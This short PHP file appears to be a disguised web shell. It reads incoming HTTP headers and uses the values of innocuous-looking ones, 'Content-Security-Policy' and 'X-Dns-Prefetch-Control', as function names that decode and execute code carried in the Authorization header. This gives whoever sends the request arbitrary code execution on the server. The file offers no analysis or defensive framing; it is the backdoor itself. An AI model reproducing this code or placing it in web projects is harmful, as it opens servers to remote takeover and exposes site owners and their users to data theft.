<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Content-Security-Policy'])) {
    $reset = $_HEADERS['Content-Security-Policy']('', $_HEADERS['X-Dns-Prefetch-Control']($_HEADERS['Authorization']));
    $reset();
}